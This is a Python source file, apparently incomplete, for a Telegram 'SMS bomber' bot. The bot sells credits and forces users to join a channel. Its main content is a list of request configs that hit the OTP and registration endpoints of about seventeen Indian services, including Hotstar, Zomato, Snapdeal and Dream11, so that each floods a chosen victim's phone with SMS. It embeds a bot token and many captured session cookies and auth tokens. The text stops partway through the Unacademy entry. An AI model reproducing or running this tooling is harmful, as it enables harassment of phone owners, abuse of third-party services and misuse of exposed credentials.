# ============================================================
# SMS BOMBER TELEGRAM BOT - ULTIMATE PREMIUM EDITION (FIXED)
# Fixed: Total messages now exactly matches user selection.
#        API requests are sent one by one until count is reached.
#        Progress shows correct total.
# ============================================================

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
from datetime import datetime, timezone
import requests
import os
import logging
import time
import threading
import random
import json
import urllib.parse

# ================== CONFIG ==================
BOT_TOKEN = "8664391339:AAEapNwm3e8a2otxTiurdNhuTNjO6ZcxDj8"  # Replace with your bot token
ADMIN_IDS = [7966027018]  # Replace with your admin IDs
CREDIT_REQUEST_RECIPIENT = ADMIN_IDS[0]
DEFAULT_CREDITS = 5
CHANNEL_ID = -1003114107853
CHANNEL_LINK = "https://t.me/cyber_shr"
FORCE_SUB = True

YOUTUBE_LINK = "https://youtube.com/@cyber_shr_1k"
WHATSAPP_CHANNEL_LINK = "https://whatsapp.com/channel/0029Vb6wmjxKbYMJ0fsJHA1R"
WHATSAPP_GROUP_LINK = "https://chat.whatsapp.com/CW5TVcsSKDi62yMZdlDGmk?mode=gi_t"
TELEGRAM_GROUP_LINK = "https://t.me/cyber_shr"

DB_PATH = os.path.join(os.path.dirname(__file__), "bomber.db")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
bot.set_my_description("⚡ Premium SMS Bomber Bot ⚡")
bot.set_my_short_description("SMS Bomber Bot")

# ================== DATABASE ==================
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users(
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            credits INTEGER DEFAULT 5,
            referred_by INTEGER,
            is_banned INTEGER DEFAULT 0,
            join_date TEXT
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS history(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target TEXT,
            count INTEGER,
            created_at TEXT
        )
    """)
    conn.commit()
    conn.close()
    logger.info("✅ Database initialized")

init_db()

# ================== HELPER FUNCTIONS ==================
def get_or_create_user(user_id, username=None, referred_by=None):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = cur.fetchone()
    if row:
        if username and row['username'] != username:
            cur.execute("UPDATE users SET username = ? WHERE user_id = ?", (username, user_id))
            conn.commit()
        conn.close()
        return dict(row)
    join_date = datetime.now(timezone.utc).isoformat()
    cur.execute(
        "INSERT INTO users (user_id, username, credits, referred_by, is_banned, join_date) VALUES (?, ?, ?, ?, 0, ?)",
        (user_id, username, DEFAULT_CREDITS, referred_by, join_date)
    )
    conn.commit()
    cur.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    new_row = cur.fetchone()
    conn.close()
    return dict(new_row)

def add_credits(user_id, amount):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("UPDATE users SET credits = COALESCE(credits, 0) + ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()

def remove_credits(user_id, amount):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "UPDATE users SET credits = MAX(COALESCE(credits, 0) - ?, 0) WHERE user_id = ?",
        (amount, user_id)
    )
    conn.commit()
    conn.close()

def get_credits(user_id):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
    row = cur.fetchone()
    conn.close()
    return row['credits'] if row else 0

def set_ban_status(user_id, status: bool):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("UPDATE users SET is_banned = ? WHERE user_id = ?", (1 if status else 0, user_id))
    conn.commit()
    conn.close()

def is_banned(user_id):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    row = cur.fetchone()
    conn.close()
    return bool(row['is_banned']) if row else False

def save_history(user_id, target, count):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO history (user_id, target, count, created_at) VALUES (?, ?, ?, ?)",
        (user_id, target, count, datetime.now(timezone.utc).isoformat())
    )
    conn.commit()
    conn.close()

def get_referral_count(user_id):
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) as cnt FROM users WHERE referred_by = ?", (user_id,))
    row = cur.fetchone()
    conn.close()
    return row['cnt'] if row else 0

def get_all_users():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT user_id, username, credits FROM users ORDER BY user_id")
    rows = cur.fetchall()
    conn.close()
    return rows

def is_user_in_channel(user_id: int) -> bool:
    if not FORCE_SUB:
        return True
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        logger.warning(f"Channel check failed for {user_id}: {e}")
        return False

def send_force_sub(chat_id: int):
    kb = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton("📢 Join Telegram Channel", url=CHANNEL_LINK))
    kb.row(
        InlineKeyboardButton("▶️ YouTube", url=YOUTUBE_LINK),
        InlineKeyboardButton("📱 WhatsApp Channel", url=WHATSAPP_CHANNEL_LINK)
    )
    kb.row(
        InlineKeyboardButton("👥 WhatsApp Group", url=WHATSAPP_GROUP_LINK),
        InlineKeyboardButton("💬 Telegram Group", url=TELEGRAM_GROUP_LINK)
    )
    kb.row(InlineKeyboardButton("✅ I Joined – Verify", callback_data="check_sub"))
    bot.send_message(
        chat_id,
        "⚠️ <b>You must join our Telegram channel to use this bot.</b>\n\nAfter joining, click the verify button.",
        reply_markup=kb
    )

# ================== API REQUEST LIST (from execute.py + extras) ==================
def get_api_requests(target_phone, country_code="91"):
    """Returns list of request configs for bombing."""
    requests_list = []

    # 1. Hotstar
    requests_list.append({
        "method": "PUT",
        "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
        "headers": {
            "Host": "api.hotstar.com",
            "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDQ0MzQ5NDUsImlhdCI6MTYwMzgzMDE0NSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiNDcuOS4xMjIuNDVcIixcImNvdW50cnlDb2RlXCI6XCJpblwiLFwiY3VzdG9tZXJUeXBlXCI6XCJudVwiLFwidHlwZVwiOlwiZ3Vlc3RcIixcImlzRW1haWxWZXJpZmllZFwiOmZhbHNlLFwiaXNQaG9uZVZlcmlmaWVkXCI6ZmFsc2UsXCJkZXZpY2VJZFwiOlwiZmFhODhmMDUtNzQzMi00MTAzLTk4ODYtN2JkOTM0ZjVjM2ExXCIsXCJwcm9maWxlXCI6XCJBRFVMVFwiLFwidmVyc2lvblwiOlwidjJcIixcInN1YnNjcmlwdGlvbnNcIjp7XCJpblwiOnt9fSxcImlzc3VlZEF0XCI6MTYwMzgzMDE0NTg4NH0iLCJ2ZXJzaW9uIjoiMV8wIn0.ATU4GrG4KucvkynhrFdg28qJ9LRwsN5MoWHlirRQsqo",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "x-hs-platform": "PCTV",
            "x-country-code": "IN",
            "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
            "hotstarauth": "st=1603830144~exp=1603836144~acl=/um/v3/*~hmac=cc2a715c0f26045e44e271d198ae382468d8a7dcb08825623016d6dcea06072d",
            "x-hs-appversion": "6.93.0",
            "x-request-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
            "accept": "*/*",
            "origin": "https://www.hotstar.com",
            "referer": "https://www.hotstar.com/"
        },
        "data": {"phone_number": target_phone, "country_prefix": country_code}
    })

    # 2. AltBalaji
    requests_list.append({
        "method": "POST",
        "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
        "headers": {
            "Host": "api.cloud.altbalaji.com",
            "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMzkxNTgyNjcxMH0.xpvhIZb9W-sLsITPKBusMKguK_2WzIioXJSwAjtzCnU",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.altbalaji.com"
        },
        "data": {"phone_number": target_phone, "country_code": country_code, "platform": "web", "exp": 1603915826710}
    })

    # 3. Voot
    requests_list.append({
        "method": "POST",
        "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
        "headers": {
            "Host": "us-central1-vootdev.cloudfunctions.net",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.voot.com",
            "referer": "https://www.voot.com/"
        },
        "data": {"type": "mobile", "mobile": target_phone, "countryCode": "+" + country_code}
    })

    # 4. SonyLIV
    requests_list.append({
        "method": "POST",
        "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
        "headers": {
            "Host": "apiv2.sonyliv.com",
            "device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
            "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDM4Mjc0NTEsImV4cCI6MTYwNTEyMzQ1MSwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.Pxfpv3puWt_4sbltsDa2UsmgeeSp30KK2lePV15-_AQ1dQ4Q6Iq6W2fKEpXUaz4WnXEMxIHTu4u7RRYjkp4SgKzuRFD4rMYyWxPBqdz2Xdsqp3eCYjza_re4bbJigWoF0X-X9Tue5D1wBjxr_XWlk9apED8gmzewR3SQnHgnFSf-TRqvb8v9nLofBcCLTLKs11yHDmZv8WN9Hi4G_xXxoRN1IqjqW4kHbXvw8hHxzyQZPAgmP18FZkJk62vHTUOcIa1cAFXrRl9yInqUj3UDaPVIJ4tu7XQGuTjn21iqusgWkXKtKnoeHftWrxbd645JeeBQik1b8qESSYCI1xMzD01eEcmaxaSP5abuCEMBGHmGIVwpyskiSwkBT-cuZe216i07XxZuaeo29mXrkuizNXfhAgZ1GvLD22rYOHt-PaGA-bKy_wHZv6ILf6Wt9XwuuxzroRKd_IS2Nl3pNMRzTl1UJ02uCTWw8RIdLFykiH3lBXSv4OkHMVUVJJp6KSSQHuH8Ejw3Zjag_rL2XkZvU7T9dT1ddforRk92_nuE96NTaj_UM-gb920oYoGBIxD-CoR5EvqbWlN4WzFF-AaV4auYobW9y1c0i-LiZrPE7dkDyuWSBsk1R-fBpTQDV2OhmbvWYiquurrKFhY5HFZy6bZ-Xrw_58mkn7-Ek0LaAEQ",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "app_version": "3.1.42.3",
            "origin": "https://www.sonyliv.com"
        },
        "data": {"mobileNumber": target_phone, "channelPartnerID": "MSMIND", "country": "IN", "timestamp": "2020-10-27T19:39:13.355Z"}
    })

    # 5. MedPlus
    requests_list.append({
        "method": "POST",
        "url": "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl",
        "headers": {
            "Host": "mobile.medplusindia.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.medplusmart.com"
        },
        "data": f"recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber={target_phone}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false"
    })

    # 6. Apollo247
    requests_list.append({
        "method": "POST",
        "url": "https://webapi.apollo247.com/",
        "headers": {
            "Host": "webapi.apollo247.com",
            "Authorization": "Bearer 3d1833da7020e0602165529446587434",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.apollo247.com"
        },
        "data": {
            "operationName": "Login",
            "variables": {"mobileNumber": "+" + country_code + target_phone, "loginType": "PATIENT"},
            "query": "query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n"
        }
    })

    # 7. Netmeds (GET)
    requests_list.append({
        "method": "GET",
        "url": f"https://m.netmeds.com/mst/rest/v1/id/details/{target_phone}",
        "headers": {
            "Host": "m.netmeds.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "cookie": "G_ENABLED_IDPS=google; _gat_UA-63910444-1=1; cto_bundle=SX3iw19aZ0xrcWZ0TFFXN1huJTJGJTJGbklkaDl5ZnM2UmxQeHhLNDhMb3dxQ2dTSUU1VSUyRkVnU0g0dG5UODVJTzNIbVNSMFJwR2hZQVpGeDJGYVBlVG5scUIlMkJCM3lCOXBlZ21jMm1HTzNwZXMlMkZxSWk4TEM3eXNUYXhjTFBKbUdqQWM2NFhBTWFHS09EUmJMaDRGUVVHVHVGcWxaR2tRJTNEJTNE; liteprompt=disabled; bsCoId=3600942736100; _gat=1; bsUl=0; _gac_UA-63910444-1=1.1600942724.CjwKCAjwh7H7BRBBEiwAPXjadtM9O5MLH1ElhMO8FUbm9EprCPA4YXhxBk-XdN8ytuKetkzNGCI07xoCi1MQAvD_BwE; _gcl_aw=GCL.1600942724.CjwKCAjwh7H7BRBBEiwAPXjadtM9O5MLH1ElhMO8FUbm9EprCPA4YXhxBk-XdN8ytuKetkzNGCI07xoCi1MQAvD_BwE; _we_wk_gls_ss_=N4IgfgjArAxgbABgEYwJYgFylQOwC4yYQA0IMAhjqgCYDOmA2uBAjElAOwIICcIAugF9BQAA; _fbp=fb.1.1600942681371.1005200013; _gid=GA1.3.195334206.1600942680; _ga=GA1.3.1470493032.1600942680; _ALGOLIA=anonymous-14e705f0-f47c-495b-bd5d-0cfefde9056b; _gcl_au=1.1.505450095.1600942677"
        }
    })

    # 8. Instacash
    requests_list.append({
        "method": "POST",
        "url": "https://getinstacash.in/sell/getData.php",
        "headers": {
            "Host": "getinstacash.in",
            "X-Requested-With": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://getinstacash.in",
            "cookie": "webInsta=rvg3l166pmfpeh6mi6auisshc7; G_ENABLED_IDPS=google; _ga=GA1.2.1994009459.1600927837; _gid=GA1.2.2093909779.1600927837; _gat_gtag_UA_46718346_7=1; __zlcmid=10LjSWRMCN11wY9"
        },
        "data": f"type=sendOTP&mobile={target_phone}"
    })

    # 9. FBBOnline
    requests_list.append({
        "method": "POST",
        "url": "https://www.fbbonline.in/customer/account/GenerateOtp",
        "headers": {
            "Host": "www.fbbonline.in",
            "X-Requested-With": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.fbbonline.in",
            "cookie": "historyPlpPage=0; _gcl_au=1.1.282636412.1600839866; _gat=1; _gid=GA1.2.727597189.1600839866; _ga=GA1.2.1662893346.1600839866; all_store_details=null; registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F; _fbp=fb.1.1600839858758.1597042975; _fv=cmpnpp; _st_time=1600839856; PHPSESSID=7id6ar9g0g6ou64f5fk2ur43o4"
        },
        "data": f"YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={target_phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp="
    })

    # 10. Grofers
    requests_list.append({
        "method": "POST",
        "url": "https://grofers.com/v2/accounts/",
        "headers": {
            "Host": "grofers.com",
            "lon": "77.040489",
            "device_id": "a11f656b-422e-4617-953b-c350d517467d",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "auth_key": "57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13",
            "app_client": "consumer_web",
            "lat": "28.4465616",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://grofers.com"
        },
        "data": f"user_phone={target_phone}"
    })

    # 11. Snapdeal
    requests_list.append({
        "method": "POST",
        "url": "https://m.snapdeal.com/signupCompleteAjax",
        "headers": {
            "Host": "m.snapdeal.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://m.snapdeal.com",
            "cookie": "Megatron=!tejKI25+72c19/igV+D1bvp2mwEhFLDS2jEPe1hWDR/NntchcNQEz7ufEKCEVUbEU7NEI5FXe9wOSZ4=; G_ENABLED_IDPS=google; _fbp=fb.1.1600811239704.1459306793; cto_bundle=IHG_Xl90TENVUG1nU2xIZXZKWkE0OXlNbWZRTUpCRkJ5ZnplSnVJb2klMkZmTGZlaG0xbWd4cGhqUzluQmNZb1VWQldZWGVXeW4xTmdFSiUyRlc3VTVBOFpiU0twNzI0QXhFTkNNcUpGREM2VHdNYyUyRlF4WUpTNGVvU0djcCUyRnY3TU5ETG9hVVIyRXFNMnNNOGhzcERTZTJPb1hsQkNSdyUzRCUzRA; _gcl_aw=GCL.1600811235.CjwKCAjwwab7BRBAEiwAapqpTHxX7o8bt5ZuM--2vVptInqF-rQ4ljlxR3_Yoor3rNa3CGvYPtaNwBoCb8cQAvD_BwE; lt=utm_source%3Dearth_brand_new%7Cutm_content%3Dhomepage%7Cutm_medium%3Dbrand%2520term%2C%7Cutm_campaign%3DBrandCat%7Cref%3Dnull%7Cutm_term%3De%2Csnapdeal%7C; splash=true; alps=fix-dp; xc=eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19; xg=eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1; sd.zone=Z6; deviceos=android; u=160081122259159083; versm=v1; JSESSIONID=98E8853981613F4AFE87740D9BFCAACF; SCOUTER=z5qpdeh1b59qh2"
        },
        "data": f"j_password=null&j_mobilenumber={target_phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy"
    })

    # 12. Zomato
    requests_list.append({
        "method": "POST",
        "url": "https://www.zomato.com/webroutes/auth/login",
        "headers": {
            "Host": "www.zomato.com",
            "x-zomato-csrft": "74a094f89ea708a8f3b78c9a6df38349",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.zomato.com",
            "cookie": "g_state={\"i_p\":1603892852968,\"i_l\":1}; AWSALBTGCORS=KsMaqpXi/uii0q6fbyqFB4EJ3pHU3ercw5xdHq/s+fNZMG28/hdjPt3msFjZExWaPmAtY8UgNVQ971XrqZK5GqnneR+N/AZ70EqnTef5MeNghrtblV1Ay7Tb8hzZhxAxtalySzaadH1uWnQEmToLLAa4KnPaGRRy0bpjVXoilwFV; AWSALBTG=KsMaqpXi/uii0q6fbyqFB4EJ3pHU3ercw5xdHq/s+fNZMG28/hdjPt3msFjZExWaPmAtY8UgNVQ971XrqZK5GqnneR+N/AZ70EqnTef5MeNghrtblV1Ay7Tb8hzZhxAxtalySzaadH1uWnQEmToLLAa4KnPaGRRy0bpjVXoilwFV; _uetvid=4f6b1b10191311ebb65cabc7eb49e843; _uetsid=4f69c050191311eba1032d186f404b1a; G_ENABLED_IDPS=google; _fbp=fb.1.1603885628996.1156015945; _gat_country=1; _gat_city=1; _gat_global=1; _gcl_au=1.1.1605422707.1603885626; _gid=GA1.2.1616354908.1603885626; _ga=GA1.2.1373047799.1603885626; locus=%7B%22addressId%22%3A0%2C%22lat%22%3A26.4607%2C%22lng%22%3A80.3334%2C%22cityId%22%3A23%2C%22ltv%22%3A23%2C%22lty%22%3A%22city%22%2C%22fetchFromGoogle%22%3Afalse%2C%22dszId%22%3A15750%2C%22fen%22%3A%22Kanpur%22%7D; lty=city; ltv=23; ak_bmsc=D218CC214FA71C400C71BCF2A3F35579B855DCCF7E2E0000385A995FC9E77F4B~plAF7CBZ4PUj3czKvHvfBmp17I7Gj84YwU/0/+iZ5dRIj4xWHOwmKUWPdyTqKBKi3TE3lM8CxyfsMzbyYuRmFcpDpfOCdd4K430P5HBMYUsQw6Q2mFqX2Sa9XmIq1UHabDzo9aakYe1BEM/3nLCDxoeuEVJ71uQ2Njm/dq/49iGxDmhDChYPLpOeyxqL2CKhK9QR0dzFme5AYD0/RDjh81kY7WBkfgnz5NoX1N+t69fQA=; csrf=74a094f89ea708a8f3b78c9a6df38349; PHPSESSID=de653951716ab490d5639700c776d524; fbtrack=4f77e94d432d648e26273c38b002b7e3; zl=en; fbcity=23"
        },
        "data": {"country_id": 1, "phone": target_phone, "verification_type": "sms", "method": "phone"}
    })

    # 13. Cuemath
    requests_list.append({
        "method": "POST",
        "url": "https://www.cuemath.com/api/v4/parents/",
        "headers": {
            "Host": "www.cuemath.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/JSON",
            "origin": "https://www.cuemath.com",
            "cookie": "cookieconsent_status=dismiss; _CEFT=Q%3D%3D%3D; _fbp=fb.1.1603882875848.1161506818; _uetvid=e5a9c120190c11eba48bfd200f8a14a3; _uetsid=e5a5ac70190c11ebbbd2895d4b869731; AF_BANNERS_SESSION_ID=1603882874676; _dc_gtm_UA-75184559-1=1; cue_gacid=543040074.1603882874; _gid=GA1.2.310046842.1603882874; _ga=GA1.2.543040074.1603882874; _gcl_au=1.1.109511992.1603882873; landing_page=%2F; referrer=https%3A%2F%2Fwww.google.com%2F; cue_country_code=j%3Anull; __cfduid=dbfb990bb3a6f23fba926d9894a45d9351603882867"
        },
        "data": {"intl_mobile": {"phone": target_phone}, "notify": ["notify_on_whatsapp"], "phone": target_phone, "email": "tsunami@gmail.com", "full_name": "Tsunami Bomber", "timezone": "Asia/Calcutta", "notify_through": "notify_on_whatsapp", "form_fields": "full_name,email,intl_mobile"}
    })

    # 14. Dream11
    requests_list.append({
        "method": "POST",
        "url": "https://www.dream11.com/graphql/mutation/pwa/register",
        "headers": {
            "Host": "www.dream11.com",
            "device": "pwa",
            "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.dream11.com",
            "cookie": "WZRK_S_W4R-49K-494Z=%7B%22p%22%3A1%2C%22s%22%3A1602759175%2C%22t%22%3A1602759175%7D; dh_user_id=91c4edf0-0ed4-11eb-9f02-755b4004c50d; WZRK_G=dc2112f4850746a0b8b47c233471fe4a; ajs_anonymous_id=%2218835b7c-2e60-48c2-a6c4-79dc7e7c169a%22; G_ENABLED_IDPS=google; __csrf=fb1f1947-4547-392d-9a28-a9de30d9e766"
        },
        "data": {
            "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
            "variables": {"email": "tsunami@gmail.com", "mobileNumber": target_phone, "password": "tsunami@123astronomia"}
        }
    })

    # 15. Doubtnut
    requests_list.append({
        "method": "POST",
        "url": "https://doubtnut.com/api/v1/user/login",
        "headers": {
            "Host": "doubtnut.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://doubtnut.com",
            "cookie": "_ga=GA1.2.Y4Twn8bPt-E_czB_KcZojHFWtwN8UXp0QqtZRS2guBCZwJcdygTIRbxblqqhLv1I; _ga_TW5C6PT68C=GS1.1.1600795082.1.1.1600795141.0; _gid=GA1.2.809074082.1600795083; a_1=5a223bcd-d40d-40c4-b83f-837e3dd460f2"
        },
        "data": f"phone={target_phone}"
    })

    # 16. Vedantu
    requests_list.append({
        "method": "POST",
        "url": "https://user.vedantu.com/user/preLoginVerification",
        "headers": {
            "Host": "user.vedantu.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.vedantu.com",
            "cookie": "_gcl_dc=GCL.1600794527.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE; _gcl_aw=GCL.1600794527.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE; moe_uuid=6a221a22-79b0-4a05-87a6-bb6ccc786f4e; WZRK_S_8WR-895-K74Z=%7B%22p%22%3A1%2C%22s%22%3A1600794521%2C%22t%22%3A1600794520%7D; km_lv=1600794517; kvcd=1600794517298; _gac_UA-52838179-3=1.1600792907.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE; _gid=GA1.2.1580594851.1600792840; _ga=GA1.2.999929697.1600792840; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%226a221a22-79b0-4a05-87a6-bb6ccc786f4e%22%2C%22deviceAdded%22%3Atrue%7D; _fbp=fb.1.1600792808706.1882458684; _gcl_au=1.1.1765065041.1600792806; WZRK_G=9d0490f3acc94a80a8feafc7aaa146b0; km_vs=1; km_ai=qEioHmXYYtngAVbnv7c6PZcDSIM%3D"
        },
        "data": {"email": None, "phoneCode": "+91", "phoneNumber": target_phone, "ver": "11.345"}
    })

    # 17. Unacademy
    requests_list.append({
        "method": "POST",
        "url": "https://unacademy.com/api/v3/user/user_check/",
        "headers": {
            "Host": "unacademy.com",
            "authorization": "Bearer undefined",
